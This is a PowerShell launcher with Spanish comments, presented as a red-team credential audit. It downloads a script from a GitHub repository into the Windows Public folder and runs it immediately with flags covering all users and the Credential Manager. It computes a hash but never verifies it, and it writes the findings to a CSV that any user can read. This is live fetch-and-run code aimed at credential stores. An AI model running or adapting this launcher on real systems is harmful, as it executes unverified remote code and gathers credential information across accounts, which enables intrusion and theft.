
$ErrorActionPreference = "Stop"

$dir = Join-Path $env:PUBLIC "RedTeam"
$script = Join-Path $dir "scan.ps1"
$csv = Join-Path $dir "keys.csv"
$url = "https://raw.githubusercontent.com/DevSecOps-vxvera/RedTeam/main/scan.ps1"

try {
    # Crear directorio publico
    New-Item -ItemType Directory -Path $dir -Force | Out-Null

    # Descargar script desde GitHub
    Invoke-WebRequest -Uri $url -OutFile $script

    # Verificar descarga
    $file = Get-Item -LiteralPath $script

    if ($file.Length -eq 0) {
        throw "El script descargado esta vacio."
    }

    Write-Host "[OK] Script descargado: $script" -ForegroundColor Green
    Write-Host "Tamano: $($file.Length) bytes"

    # Calcular SHA256
    Get-FileHash -LiteralPath $script -Algorithm SHA256 |
        Select-Object Algorithm, Hash

    # Eliminar CSV anterior
    if (Test-Path -LiteralPath $csv) {
        Remove-Item -LiteralPath $csv -Force
    }

    # Ejecutar auditoria
    Write-Host "[INFO] Ejecutando auditoria..." -ForegroundColor Cyan

    & $script -AllUsers -CredentialManager -CsvPath $csv

    if (-not $?) {
        throw "La auditoria devolvio un error."
    }

    Write-Host "[OK] Ejecucion finalizada." -ForegroundColor Green

    # Crear CSV con encabezado si no hay hallazgos
    if (-not (Test-Path -LiteralPath $csv)) {
        '"NombreKey"' | Set-Content -LiteralPath $csv -Encoding UTF8
        Write-Warning "No se encontraron nombres. Se creo CSV sin registros."
    }

    # Verificar evidencia
    $total = @(Import-Csv -LiteralPath $csv).Count

    Write-Host "[OK] CSV generado: $csv" -ForegroundColor Green
    Write-Host "Total de nombres identificados: $total"

    Get-Item -LiteralPath $script, $csv |
        Select-Object Name, Length, LastWriteTime
}
catch {
    Write-Host "[ERROR] $($_.Exception.Message)" -ForegroundColor Red
}
